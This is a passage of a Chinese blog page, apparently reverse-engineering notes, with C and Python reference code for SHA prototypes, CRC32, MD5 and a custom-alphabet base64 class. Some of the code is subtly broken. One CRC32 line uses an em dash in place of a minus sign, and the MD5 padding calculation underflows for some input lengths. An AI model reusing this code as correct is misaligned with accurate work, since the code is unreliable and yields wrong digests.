class="params">(<span class="type">unsigned</span> <span class="type">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sha_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *A,<span class="type">unsigned</span> <span class="type">int</span> *B,<span class="type">unsigned</span> <span class="type">int</span> *C,<span class="type">unsigned</span> <span class="type">int</span> *D,<span class="type">unsigned</span> <span class="type">int</span> *E,<span class="type">unsigned</span> <span class="type">int</span> *F,<span class="type">unsigned</span> <span class="type">int</span> *G,<span class="type">unsigned</span> <span class="type">int</span> *H)</span></span>;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">sha_update</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> **out, <span class="type">char</span> <span class="type">const</span> *input, <span class="type">size_t</span> inLen)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sha_transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *out,  <span class="type">char</span> *input)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">data_round</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *A,<span class="type">unsigned</span> <span class="type">int</span> *B,<span class="type">unsigned</span> <span class="type">int</span> *C,<span class="type">unsigned</span> <span class="type">int</span> *D,<span class="type">unsigned</span> <span class="type">int</span> *E,<span class="type">unsigned</span> <span class="type">int</span> *F,<span class="type">unsigned</span> <span class="type">int</span> *G,<span class="type">unsigned</span> <span class="type">int</span> *H,<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> *M)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sha_calc</span><span class="params">(<span class="type">char</span> *out, <span class="type">char</span> <span class="type">const</span> *input, <span class="type">size_t</span> inLen)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="crc32"><a class="markdownIt-Anchor" href="#crc32">#</a> CRC32</h4>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">crc32</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buf, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint8_t</span>* p = buf;</span><br><span class="line">  <span class="type">uint32_t</span> crc = ~<span class="number">0U</span>;</span><br><span class="line">  <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">    crc = crc32_tab[(crc ^ *p++) &amp; <span class="number">0xFF</span>] ^ (crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uint <span class="title">crc32</span><span class="params">(byte *data, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint r = ~<span class="number">0</span>; byte *end = data + size;</span><br><span class="line">  <span class="keyword">while</span>(data &lt; end)</span><br><span class="line">  &#123;</span><br><span class="line">    r ^= *data++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      uint t = ~((r&amp;<span class="number">1</span>) — <span class="number">1</span>); r = (r&gt;&gt;<span class="number">1</span>) ^ (<span class="number">0xEDB88320</span> &amp; t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ~r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="md5"><a class="markdownIt-Anchor" href="#md5">#</a> md5</h4>
<p>cyberchef 本地请</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">ROTATE_LEFT</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x, <span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">F</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> X, <span class="type">unsigned</span> <span class="type">int</span> Y, <span class="type">unsigned</span> <span class="type">int</span> Z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (X &amp; Y) | ((~X) &amp; Z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">G</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> X, <span class="type">unsigned</span> <span class="type">int</span> Y, <span class="type">unsigned</span> <span class="type">int</span> Z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (X &amp; Z) | (Y &amp; (~Z));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">H</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> X, <span class="type">unsigned</span> <span class="type">int</span> Y, <span class="type">unsigned</span> <span class="type">int</span> Z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (X ^ Y ^ Z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">I</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> X, <span class="type">unsigned</span> <span class="type">int</span> Y, <span class="type">unsigned</span> <span class="type">int</span> Z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Y ^ (X | (~Z)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FF</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a,<span class="type">unsigned</span> <span class="type">int</span> b,<span class="type">unsigned</span> <span class="type">int</span> c,<span class="type">unsigned</span> <span class="type">int</span> d,<span class="type">unsigned</span> <span class="type">int</span> m,<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> t,<span class="type">unsigned</span> <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">  *a += <span class="built_in">F</span>(b,c,d) + m + t;</span><br><span class="line">  *a = <span class="built_in">ROTATE_LEFT</span>(*a,s);</span><br><span class="line">  *a += b;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GG</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a,<span class="type">unsigned</span> <span class="type">int</span> b,<span class="type">unsigned</span> <span class="type">int</span> c,<span class="type">unsigned</span> <span class="type">int</span> d,<span class="type">unsigned</span> <span class="type">int</span> m,<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> t,<span class="type">unsigned</span> <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">  *a += <span class="built_in">G</span>(b,c,d) + m + t;</span><br><span class="line">  *a = <span class="built_in">ROTATE_LEFT</span>(*a,s);</span><br><span class="line">  *a += b;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HH</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a,<span class="type">unsigned</span> <span class="type">int</span> b,<span class="type">unsigned</span> <span class="type">int</span> c,<span class="type">unsigned</span> <span class="type">int</span> d,<span class="type">unsigned</span> <span class="type">int</span> m,<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> t,<span class="type">unsigned</span> <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">  *a += <span class="built_in">H</span>(b,c,d) + m + t;</span><br><span class="line">  *a = <span class="built_in">ROTATE_LEFT</span>(*a,s);</span><br><span class="line">  *a += b;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">II</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a,<span class="type">unsigned</span> <span class="type">int</span> b,<span class="type">unsigned</span> <span class="type">int</span> c,<span class="type">unsigned</span> <span class="type">int</span> d,<span class="type">unsigned</span> <span class="type">int</span> m,<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> t,<span class="type">unsigned</span> <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">  *a += <span class="built_in">I</span>(b,c,d) + m + t;</span><br><span class="line">  *a = <span class="built_in">ROTATE_LEFT</span>(*a,s);</span><br><span class="line">  *a += b;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">shift</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> t1,t2,t3,t4;</span><br><span class="line">  t1 = (a &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">  t2 = (a &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  t3 = (a &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>;</span><br><span class="line">  t4 = (a &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="comment">//printf(&quot;%x\n&quot;,t1 + t2 + t3 + t4);</span></span><br><span class="line">  <span class="keyword">return</span> (t1 + t2 + t3 + t4);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MD5 initialization */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">md5_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *A,<span class="type">unsigned</span> <span class="type">int</span> *B,<span class="type">unsigned</span> <span class="type">int</span> *C,<span class="type">unsigned</span> <span class="type">int</span> *D)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[] = &#123;</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0xEF</span>,</span><br><span class="line">    <span class="number">0xFE</span>, <span class="number">0xDC</span>, <span class="number">0xBA</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x54</span>, <span class="number">0x32</span>, <span class="number">0x10</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(A, data, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(B, data + <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(C, data + <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(D, data + <span class="number">12</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">md5_update</span><span class="params">(<span class="type">char</span> **out, <span class="type">char</span> <span class="type">const</span> *input, <span class="type">size_t</span> inLen)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> bitLen = inLen * <span class="number">8</span>; <span class="comment">// the bit length of input</span></span><br><span class="line">  <span class="comment">//size_t fillLen = 64 - (inLen - 56) % 64;  // the length of padding </span></span><br><span class="line">  <span class="comment">//printf(&quot;len:%d\n&quot;,fillLen);</span></span><br><span class="line">  <span class="type">size_t</span> fillLen = <span class="number">56</span> - (inLen % <span class="number">64</span>);</span><br><span class="line">  <span class="comment">//printf(&quot;temp:%d\n&quot;,temp);</span></span><br><span class="line">  <span class="type">size_t</span> filledLen = inLen + fillLen + <span class="number">8</span>; <span class="comment">// the length after padding</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *outBuf = (<span class="type">char</span>*)<span class="built_in">calloc</span>(filledLen, <span class="built_in">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">  <span class="built_in">memcpy</span>(outBuf, input, inLen);</span><br><span class="line">  outBuf[inLen] = <span class="number">0x80</span>;<span class="comment">// padding 1</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  j = <span class="built_in">sizeof</span>(inLen);  <span class="comment">// the length of input_lengh</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; j; i++) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(outBuf + filledLen - <span class="number">8</span> + i, (<span class="type">char</span>*)(&amp;bitLen) + i, <span class="number">1</span>); <span class="comment">// LittleEndian</span></span><br><span class="line">    <span class="comment">//memcpy(outBuf + filledLen - 4 + i, (char*)(&amp;bitLen) + j - 1 - i, 1);</span></span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *out = outBuf;  <span class="comment">// the data after padding</span></span><br><span class="line">  <span class="keyword">return</span> filledLen; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">md5_transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *out,  <span class="type">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(out,input,GROUP_SIZE);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">data_round</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *A, <span class="type">unsigned</span> <span class="type">int</span> *B, <span class="type">unsigned</span> <span class="type">int</span> *C, <span class="type">unsigned</span> <span class="type">int</span> *D, <span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> *m)</span></span>&#123;</span><br><span class="line">  <span class="comment">//int k;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> a = *A;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> b = *B;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> c = *C;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> d = *D;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* round 1 */</span></span><br><span class="line">  <span class="built_in">FF</span>(&amp;a,b,c,d,m[<span class="number">0</span>],T[<span class="number">0</span>],S[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;d,a,b,c,m[<span class="number">1</span>],T[<span class="number">1</span>],S[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;c,d,a,b,m[<span class="number">2</span>],T[<span class="number">2</span>],S[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">FF</span>(&amp;b,c,d,a,m[<span class="number">3</span>],T[<span class="number">3</span>],S[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;a,b,c,d,m[<span class="number">4</span>],T[<span class="number">4</span>],S[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;d,a,b,c,m[<span class="number">5</span>],T[<span class="number">5</span>],S[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;c,d,a,b,m[<span class="number">6</span>],T[<span class="number">6</span>],S[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;b,c,d,a,m[<span class="number">7</span>],T[<span class="number">7</span>],S[<span class="number">3</span>]);	</span><br><span class="line">  <span class="built_in">FF</span>(&amp;a,b,c,d,m[<span class="number">8</span>],T[<span class="number">8</span>],S[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;d,a,b,c,m[<span class="number">9</span>],T[<span class="number">9</span>],S[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;c,d,a,b,m[<span class="number">10</span>],T[<span class="number">10</span>],S[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;b,c,d,a,m[<span class="number">11</span>],T[<span class="number">11</span>],S[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;a,b,c,d,m[<span class="number">12</span>],T[<span class="number">12</span>],S[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;d,a,b,c,m[<span class="number">13</span>],T[<span class="number">13</span>],S[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;c,d,a,b,m[<span class="number">14</span>],T[<span class="number">14</span>],S[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">FF</span>(&amp;b,c,d,a,m[<span class="number">15</span>],T[<span class="number">15</span>],S[<span class="number">3</span>]);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* round 2 */</span></span><br><span class="line">    <span class="built_in">GG</span>(&amp;a,b,c,d,m[<span class="number">1</span>],T[<span class="number">16</span>],S[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">GG</span>(&amp;d,a,b,c,m[<span class="number">6</span>],T[<span class="number">17</span>],S[<span class="number">5</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;c,d,a,b,m[<span class="number">11</span>],T[<span class="number">18</span>],S[<span class="number">6</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;b,c,d,a,m[<span class="number">0</span>],T[<span class="number">19</span>],S[<span class="number">7</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;a,b,c,d,m[<span class="number">5</span>],T[<span class="number">20</span>],S[<span class="number">4</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;d,a,b,c,m[<span class="number">10</span>],T[<span class="number">21</span>],S[<span class="number">5</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;c,d,a,b,m[<span class="number">15</span>],T[<span class="number">22</span>],S[<span class="number">6</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;b,c,d,a,m[<span class="number">4</span>],T[<span class="number">23</span>],S[<span class="number">7</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;a,b,c,d,m[<span class="number">9</span>],T[<span class="number">24</span>],S[<span class="number">4</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;d,a,b,c,m[<span class="number">14</span>],T[<span class="number">25</span>],S[<span class="number">5</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;c,d,a,b,m[<span class="number">3</span>],T[<span class="number">26</span>],S[<span class="number">6</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;b,c,d,a,m[<span class="number">8</span>],T[<span class="number">27</span>],S[<span class="number">7</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;a,b,c,d,m[<span class="number">13</span>],T[<span class="number">28</span>],S[<span class="number">4</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;d,a,b,c,m[<span class="number">2</span>],T[<span class="number">29</span>],S[<span class="number">5</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;c,d,a,b,m[<span class="number">7</span>],T[<span class="number">30</span>],S[<span class="number">6</span>]);</span><br><span class="line">  <span class="built_in">GG</span>(&amp;b,c,d,a,m[<span class="number">12</span>],T[<span class="number">31</span>],S[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* round 3 */</span></span><br><span class="line">   <span class="built_in">HH</span>(&amp;a,b,c,d,m[<span class="number">5</span>],T[<span class="number">32</span>],S[<span class="number">8</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;d,a,b,c,m[<span class="number">8</span>],T[<span class="number">33</span>],S[<span class="number">9</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;c,d,a,b,m[<span class="number">11</span>],T[<span class="number">34</span>],S[<span class="number">10</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;b,c,d,a,m[<span class="number">14</span>],T[<span class="number">35</span>],S[<span class="number">11</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;a,b,c,d,m[<span class="number">1</span>],T[<span class="number">36</span>],S[<span class="number">8</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;d,a,b,c,m[<span class="number">4</span>],T[<span class="number">37</span>],S[<span class="number">9</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;c,d,a,b,m[<span class="number">7</span>],T[<span class="number">38</span>],S[<span class="number">10</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;b,c,d,a,m[<span class="number">10</span>],T[<span class="number">39</span>],S[<span class="number">11</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;a,b,c,d,m[<span class="number">13</span>],T[<span class="number">40</span>],S[<span class="number">8</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;d,a,b,c,m[<span class="number">0</span>],T[<span class="number">41</span>],S[<span class="number">9</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;c,d,a,b,m[<span class="number">3</span>],T[<span class="number">42</span>],S[<span class="number">10</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;b,c,d,a,m[<span class="number">6</span>],T[<span class="number">43</span>],S[<span class="number">11</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;a,b,c,d,m[<span class="number">9</span>],T[<span class="number">44</span>],S[<span class="number">8</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;d,a,b,c,m[<span class="number">12</span>],T[<span class="number">45</span>],S[<span class="number">9</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;c,d,a,b,m[<span class="number">15</span>],T[<span class="number">46</span>],S[<span class="number">10</span>]);</span><br><span class="line">   <span class="built_in">HH</span>(&amp;b,c,d,a,m[<span class="number">2</span>],T[<span class="number">47</span>],S[<span class="number">11</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* round 4 */</span></span><br><span class="line">  <span class="built_in">II</span>(&amp;a,b,c,d,m[<span class="number">0</span>],T[<span class="number">48</span>],S[<span class="number">12</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;d,a,b,c,m[<span class="number">7</span>],T[<span class="number">49</span>],S[<span class="number">13</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;c,d,a,b,m[<span class="number">14</span>],T[<span class="number">50</span>],S[<span class="number">14</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;b,c,d,a,m[<span class="number">5</span>],T[<span class="number">51</span>],S[<span class="number">15</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;a,b,c,d,m[<span class="number">12</span>],T[<span class="number">52</span>],S[<span class="number">12</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;d,a,b,c,m[<span class="number">3</span>],T[<span class="number">53</span>],S[<span class="number">13</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;c,d,a,b,m[<span class="number">10</span>],T[<span class="number">54</span>],S[<span class="number">14</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;b,c,d,a,m[<span class="number">1</span>],T[<span class="number">55</span>],S[<span class="number">15</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;a,b,c,d,m[<span class="number">8</span>],T[<span class="number">56</span>],S[<span class="number">12</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;d,a,b,c,m[<span class="number">15</span>],T[<span class="number">57</span>],S[<span class="number">13</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;c,d,a,b,m[<span class="number">6</span>],T[<span class="number">58</span>],S[<span class="number">14</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;b,c,d,a,m[<span class="number">13</span>],T[<span class="number">59</span>],S[<span class="number">15</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;a,b,c,d,m[<span class="number">4</span>],T[<span class="number">60</span>],S[<span class="number">12</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;d,a,b,c,m[<span class="number">11</span>],T[<span class="number">61</span>],S[<span class="number">13</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;c,d,a,b,m[<span class="number">2</span>],T[<span class="number">62</span>],S[<span class="number">14</span>]);</span><br><span class="line">  <span class="built_in">II</span>(&amp;b,c,d,a,m[<span class="number">9</span>],T[<span class="number">63</span>],S[<span class="number">15</span>]);</span><br><span class="line"></span><br><span class="line">  *A += a;</span><br><span class="line">  *B += b;</span><br><span class="line">  *C += c;</span><br><span class="line">  *D += d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">md5_calc</span><span class="params">(<span class="type">char</span> *out, <span class="type">char</span> <span class="type">const</span> *input, <span class="type">size_t</span> inLen)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> filledLen;</span><br><span class="line">  <span class="type">char</span> *filledData; </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> A,B,C,D;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *M = (<span class="type">unsigned</span> <span class="type">int</span>*)<span class="built_in">malloc</span>(GROUP_SIZE);</span><br><span class="line"></span><br><span class="line">  filledLen = <span class="built_in">md5_update</span>(&amp;filledData,input,inLen);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">//printf(&quot;input:%s\n&quot;,input);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">md5_init</span>(&amp;A,&amp;B,&amp;C,&amp;D);</span><br><span class="line">    <span class="comment">//printf(&quot;%x\n%x\n%x\n%x\n&quot;,A,B,C,D);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; filledLen / GROUP_SIZE;i++)&#123;</span><br><span class="line">    <span class="built_in">md5_transform</span>(M, filledData + i * <span class="number">64</span>);  <span class="comment">//char to int </span></span><br><span class="line">    <span class="built_in">data_round</span>(&amp;A,&amp;B,&amp;C,&amp;D,M);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//printf(&quot;%x\n%x\n%x\n%x\n&quot;,A,B,C,D); </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(out,<span class="string">&quot;%08x%08x%08x%08x&quot;</span>,<span class="built_in">shift</span>(A),<span class="built_in">shift</span>(B),<span class="built_in">shift</span>(C),<span class="built_in">shift</span>(D));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(M);</span><br><span class="line">  M = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">free</span>(filledData);</span><br><span class="line">  filledData = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2">#</a> 其他</h2>
<h3 id="大数计算"><a class="markdownIt-Anchor" href="#大数计算">#</a> 大数计算</h3>
<h3 id="base系列"><a class="markdownIt-Anchor" href="#base系列">#</a> base 系列</h3>
<h4 id="base64换表"><a class="markdownIt-Anchor" href="#base64换表">#</a> base64 换表</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Customized base64 algorithm</span></span><br><span class="line"><span class="string">You can set you own indexing string using the config() method.</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    b = CusBase64()</span></span><br><span class="line"><span class="string">    b.encode(&#x27;binary\x00string&#x27;)  # Output: YmluYXJ5AHN0cmluZw==</span></span><br><span class="line"><span class="string">    b.decode(&#x27;YmluYXJ5AHN0cmluZw==&#x27;) # Output: binary\x00string</span></span><br><span class="line"><span class="string">    b.config(&#x27;aABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz0123456789+/&#x27;)</span></span><br><span class="line"><span class="string">    b.decode(&#x27;c2UsYi1kYWM0cnUjdFlvbiAjb21wbFU0YP==&#x27;) # Output: self-destruction complete</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CusBase64</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    DEFAULT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.idx_str = CusBase64.DEFAULT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Encode string using the customized indexing string.</span></span><br><span class="line"><span class="string">        - args:</span></span><br><span class="line"><span class="string">            str: String to be encoded</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># Get the binary string</span></span><br><span class="line">        binary = <span class="string">&#x27;&#x27;</span>.join([<span 